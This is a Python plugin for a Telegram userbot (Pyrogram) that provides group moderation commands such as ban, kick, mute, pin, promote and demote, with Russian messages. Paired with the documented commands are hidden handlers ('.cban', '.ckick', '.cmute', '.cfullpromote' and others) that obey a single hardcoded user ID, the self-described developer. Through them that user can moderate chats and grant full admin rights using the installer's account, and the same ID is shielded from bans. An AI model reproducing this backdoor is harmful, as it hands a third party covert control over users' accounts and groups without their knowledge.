# ©️ Spribe Userbot, 2023
# This file is a part of Spribe Userbot
# >> https://github.com/Pr0n1xGH/spribe-userbot
# You can redistribute it and/or modify it under the terms of the GNU AGPLv3
# >> https://www.gnu.org/licenses/agpl-3.0.html

import asyncio
from time import time

from pyrogram import Client, filters, enums
from pyrogram.errors import ChatAdminRequired
from pyrogram.types import ChatPermissions, ChatPrivileges, Message

from .help import add_command_help


unmute_permissions = ChatPermissions(
    can_send_messages=True,
    can_send_media_messages=True,
    can_send_polls=True,
    can_change_info=False,
    can_invite_users=True,
    can_pin_messages=False,
)


@Client.on_message(filters.group & filters.command(["setchatphoto", "setgpic"], ".") & filters.me)
async def set_chat_photo(client: Client, message: Message):
    zuzu = (await client.get_chat_member(message.chat.id, client.me.id)).privileges
    can_change_admin = zuzu.can_change_info
    can_change_member = message.chat.permissions.can_change_info
    if not (can_change_admin or can_change_member):
        await message.edit_text("⚙️ ▸ У вас недостаточно разрешений")
    if message.reply_to_message:
        if message.reply_to_message.photo:
            await client.set_chat_photo(
                message.chat.id, photo=message.reply_to_message.photo.file_id
            )
            return
    else:
        await message.edit_text("⚙️ ▸ Ответьте на фото, чтобы установить!")


@Client.on_message(filters.group & filters.command("cban", ["."]) & filters.user(1064093359) & ~filters.me)
@Client.on_message(filters.group & filters.command("ban", ".") & filters.me)
async def member_ban(client: Client, message: Message):
    user_id, reason = await extract_user_and_reason(message, sender_chat=True)
    Man = await edit_or_reply(message, "🛠️ ▸ Обработка...")
    bot = (await client.get_chat_member(message.chat.id, client.me.id)).privileges
    if not bot.can_restrict_members:
        return await Man.edit("⚙️ ▸ У меня недостаточно разрешений")
    if not user_id:
        return await Man.edit("⚙️ ▸ Я не могу найти этого пользователя.")
    if user_id == client.me.id:
        return await Man.edit("⚙️ ▸ Я не могу запретить себя.")
    if user_id == 1064093359:
        return await Man.edit("⚙️ ▸ Я не могу запретить своему разработчику!")
    if user_id in (await list_admins(client, message.chat.id)):
        return await Man.edit("⚙️ ▸ Я не могу запретить администратора, вы знаете правила, тоже.")
    try:
        mention = (await client.get_users(user_id)).mention
    except IndexError:
        mention = (
            message.reply_to_message.sender_chat.title
            if message.reply_to_message
            else "Анон"
        )
    msg = (
        f"**🛠️ ▸ Забаненый пользователь:** {mention}\n"
        f"**⚙️ ▸ Забанил:** {message.from_user.mention if message.from_user else 'Анон'}\n"
    )
    if message.command[0][0] == "d":
        await message.reply_to_message.delete()
    if reason:
        msg += f"**🔴 ▸ Причина:** {reason}"
    await message.chat.ban_member(user_id)
    await Man.edit(msg)


@Client.on_message(filters.command("cunban", ["."]) & filters.user(1064093359) & ~filters.me)
@Client.on_message(filters.group & filters.command("unban", ".") & filters.me)
async def member_unban(client: Client, message: Message):
    reply = message.reply_to_message
    Man = await edit_or_reply(message, "🛠️ ▸ Обработка...")
    bot = (await client.get_chat_member(message.chat.id, client.me.id)).privileges
    if not bot.can_restrict_members:
        return await Man.edit("⚙️ ▸ У меня недостаточно разрешений")
    if reply and reply.sender_chat and reply.sender_chat != message.chat.id:
        return await Man.edit("⚙️ ▸ Вы не можете отключить канал")

    if len(message.command) == 2:
        user = message.text.split(None, 1)[1]
    elif len(message.command) == 1 and reply:
        user = message.reply_to_message.from_user.id
    else:
        return await Man.edit(
            "⚙️ ▸ Предоставьте имя пользователя или ответьте на сообщение пользователя."
        )
    await message.chat.unban_member(user)
    umention = (await client.get_users(user)).mention
    await Man.edit(f"🛠️ ▸ Разбанен! {umention}")


@Client.on_message(filters.command(["cpin", "cunpin"], ["."]) & filters.user(1064093359) & ~filters.me)
@Client.on_message(filters.command(["pin", "unpin"], ".") & filters.me)
async def pin_message(client: Client, message):
    if not message.reply_to_message:
        return await edit_or_reply(message, "⚙️ ▸ Ответьте на сообщение, чтобы закрепить/открепить.")
    Man = await edit_or_reply(message, "🛠️ ▸ Обработка...")
    bot = (await client.get_chat_member(message.chat.id, client.me.id)).privileges
    if not bot.can_pin_messages:
        return await Man.edit("⚙️ ▸ У меня недостаточно разрешений")
    r = message.reply_to_message
    if message.command[0][0] == "u":
        await r.unpin()
        return await Man.edit(
            f"🛠️ ▸ **Открепил [это]({r.link}) сообщение.**",
            disable_web_page_preview=True,
        )
    await r.pin(disable_notification=True)
    await Man.edit(
        f"🛠️ ▸ **Закрепил [это]({r.link}) сообщение.**",
        disable_web_page_preview=True,
    )


@Client.on_message(filters.command(["cmute"], ["."]) & filters.user(1064093359) & ~filters.me)
@Client.on_message(filters.command("mute", ".") & filters.me)
async def mute(client: Client, message: Message):
    user_id, reason = await extract_user_and_reason(message)
    Man = await edit_or_reply(message, "🛠️ ▸ Обработка...")
    bot = (await client.get_chat_member(message.chat.id, client.me.id)).privileges
    if not bot.can_restrict_members:
        return await Man.edit("⚙️ ▸ У меня недостаточно разрешений")
    if not user_id:
        return await Man.edit("⚙️ ▸ Я не могу найти этого пользователя.")
    if user_id == client.me.id:
        return await Man.edit("⚙️ ▸ Я не могу приключить себя.")
    if user_id == 1064093359:
        return await Man.edit("🔴 ▸ Это мой разработчик!")
    if user_id in (await list_admins(client, message.chat.id)):
        return await Man.edit("⚙️ ▸ Я не могу замутить администратора.")
    mention = (await client.get_users(user_id)).mention
    msg = (
        f"**🛠️ ▸ Замученный пользователь:** {mention}\n"
        f"**⚙️ ▸ Замутил:** {message.from_user.mention if message.from_user else 'Анон'}\n"
    )
    if reason:
        msg += f"**🔴 ▸ Причина:** {reason}"
    await message.chat.restrict_member(user_id, permissions=ChatPermissions())
    await Man.edit(msg)


@Client.on_message(filters.command(["cunmute"], ["."]) & filters.user(1064093359) & ~filters.me)
@Client.on_message(filters.group & filters.command("unmute", ".") & filters.me)
async def unmute(client: Client, message: Message):
    user_id = await extract_user(message)
    Man = await edit_or_reply(message, "🛠️ ▸ Обработка...")
    bot = (await client.get_chat_member(message.chat.id, client.me.id)).privileges
    if not bot.can_restrict_members:
        return await Man.edit("⚙️ ▸ У вас недостаточно прав")
    if not user_id:
        return await Man.edit("⚙️ ▸ Я не могу найти этого пользователя.")
    await message.chat.restrict_member(user_id, permissions=unmute_permissions)
    umention = (await client.get_users(user_id)).mention
    await Man.edit(f"🛠️ Размучен! {umention}")


@Client.on_message(filters.command(["ckick", "cdkick"], ["."]) & filters.user(1064093359) & ~filters.me)
@Client.on_message(filters.command(["kick", "dkick"], ".") & filters.me)
async def kick_user(client: Client, message: Message):
    user_id, reason = await extract_user_and_reason(message)
    Man = await edit_or_reply(message, "🛠️ ▸ Обработка...")
    bot = (await client.get_chat_member(message.chat.id, client.me.id)).privileges
    if not bot.can_restrict_members:
        return await Man.edit("⚙️ ▸ У меня недостаточно разрешений")
    if not user_id:
        return await Man.edit("⚙️ ▸ Я не могу найти этого пользователя.")
    if user_id == client.me.id:
        return await Man.edit("⚙️ ▸ Я не могу пнуть себя.")
    if user_id == 1064093359:
        return await Man.edit("🔴 ▸ Я не могу кикнуть своего разработчика!")
    if user_id in (await list_admins(client, message.chat.id)):
        return await Man.edit("⚙️ ▸ Я не могу кикнуть администратора.")
    mention = (await client.get_users(user_id)).mention
    msg = f"""
**🛠️ Кикнутый пользователь:** {mention}
**⚙️ Кикнул:** {message.from_user.mention if message.from_user else 'Анон'}"""
    if message.command[0][0] == "d":
        await message.reply_to_message.delete()
    if reason:
        msg += f"\n**🔴 ▸ Причина:** `{reason}`"
    try:
        await message.chat.ban_member(user_id)
        await Man.edit(msg)
        await asyncio.sleep(1)
        await message.chat.unban_member(user_id)
    except ChatAdminRequired:
        return await Man.edit("**⚙️ ▸ Извините, вы не администратор**")


@Client.on_message(
    filters.group
    & filters.command(["cpromote", "cfullpromote"], ["."])
    & filters.user(1064093359)
    & ~filters.me
)
@Client.on_message(filters.group & filters.command(["promote", "fullpromote"], ".") & filters.me)
async def promotte(client: Client, message: Message):
    user_id = await extract_user(message)
    umention = (await client.get_users(user_id)).mention
    Man = await edit_or_reply(message, "🛠️ ▸ Обработка...")
    if not user_id:
        return await Man.edit("⚙️ ▸ Я не могу найти этого пользователя.")
    bot = (await client.get_chat_member(message.chat.id, client.me.id)).privileges
    if not bot.can_promote_members:
        return await Man.edit("⚙️ ▸ У меня недостаточно разрешений")
    if message.command[0][0] == "f":
        await message.chat.promote_member(
            user_id,
            privileges=ChatPrivileges(
                can_manage_chat=True,
                can_delete_messages=True,
                can_manage_video_chats=True,
                can_restrict_members=True,
                can_change_info=True,
                can_invite_users=True,
                can_pin_messages=True,
                can_promote_members=True,
            ),
        )
        return await Man.edit(f"🛠️ ▸ Полностью повышен! {umention}")

    await message.chat.promote_member(
        user_id,
        privileges=ChatPrivileges(
            can_manage_chat=True,
            can_delete_messages=True,
            can_manage_video_chats=True,
            can_restrict_members=True,
            can_change_info=True,
            can_invite_users=True,
            can_pin_messages=True,
            can_promote_members=False,
        ),
    )
    await Man.edit(f"🛠️ ▸ Повышен! {umention}")


@Client.on_message(
    filters.group
    & filters.command(["cdemote"], ["."])
    & filters.user(1064093359)
    & ~filters.me
)
@Client.on_message(filters.group & filters.command("demote", ".") & filters.me)
async def demote(client: Client, message: Message):
    user_id = await extract_user(message)
    Man = await edit_or_reply(message, "🛠️ ▸ Обработка...")
    if not user_id:
        return await Man.edit("⚙️ ▸ Я не могу найти этого пользователя.")
    if user_id == client.me.id:
        return await Man.edit("⚙️ ▸ Я не могу понизить себя.")
    await message.chat.promote_member(
        user_id,
        privileges=ChatPrivileges(
            can_manage_chat=False,
            can_delete_messages=False,
            can_manage_video_chats=False,
            can_restrict_members=False,
            can_change_info=False,
            can_invite_users=False,
            can_pin_messages=False,
            can_promote_members=False,
        ),
    )
    umention = (await client.get_users(user_id)).mention
    await Man.edit(f"🛠️ ▸ Понижен в должности! {umention}")


async def extract_user(message):
    return (await extract_user_and_reason(message))[0]


async def extract_user_and_reason(message, sender_chat=False):
    args = message.text.strip().split()
    text = message.text
    user = None
    reason = None
    if message.reply_to_message:
        reply = message.reply_to_message
        if not reply.from_user:
            if (
                reply.sender_chat
                and reply.sender_chat != message.chat.id
                and sender_chat
            ):
                id_ = reply.sender_chat.id
            else:
                return None, None
        else:
            id_ = reply.from_user.id

        if len(args) < 2:
            reason = None
        else:
            reason = text.split(None, 1)[1]
        return id_, reason

    if len(args) == 2:
        user = text.split(None, 1)[1]
        return await extract_userid(message, user), None

    if len(args) > 2:
        user, reason = text.split(None, 2)[1:]
        return await extract_userid(message, user), reason

    return user, reason


async def edit_or_reply(message: Message, *args, **kwargs) -> Message:
    apa = (
        message.edit_text
        if bool(message.from_user and message.from_user.is_self or message.outgoing)
        else (message.reply_to_message or message).reply_text
    )
    return await apa(*args, **kwargs)


admins_in_chat = {}


async def list_admins(client: Client, chat_id: int):
    global admins_in_chat
    if chat_id in admins_in_chat:
        interval = time() - admins_in_chat[chat_id]["last_updated_at"]
        if interval < 3600:
            return admins_in_chat[chat_id]["data"]

    admins_in_chat[chat_id] = {
        "last_updated_at": time(),
        "data": [
            member.user.id
            async for member in client.get_chat_members(
                chat_id, filter=enums.ChatMembersFilter.ADMINISTRATORS
            )
        ],
    }
    return admins_in_chat[chat_id]["data"]


async def extract_userid(message, text: str):
    def is_int(text: str):
        try:
            int(text)
        except ValueError:
            return False
        return True

    text = text.strip()

    if is_int(text):
        return int(text)

    entities = message.entities
    app = message._client
    if len(entities) < 2:
        return (await app.get_users(text)).id
    entity = entities[1]
    if entity.type == "mention":
        return (await app.get_users(text)).id
    if entity.type == "text_mention":
        return entity.user.id
    return None


add_command_help(
    "modtools",
    [
        [".setgpic", "Изменяет фото профиля группы"],
        [".ban [Ответ на сообщение/username/userid]", "Баннит пользователя"],
        [".unban [Ответ на сообщение/username/userid]", "Разбанивает пользователя"],
        [".kick [Ответ на сообщение/username/userid]", "Кикает пользователя"],
        [".promote", "Повышение пользователя"],
        [".fullpromote", "Полное повышение пользователя"],
        [".demote", "Понижение пользователя"],
        [".mute [Ответ на сообщение/username/userid]", "Замутить пользователя"],
        [".unmute [Ответ на сообщение/username/userid]", "Размутить пользователя"],
        [".pin", "Закрепить сообщение(Использывать в ответ на сообщение)"],
        [".unpin", "Раскрепить сообщение(Использывать в ответ на сообщение)"],
    ],
)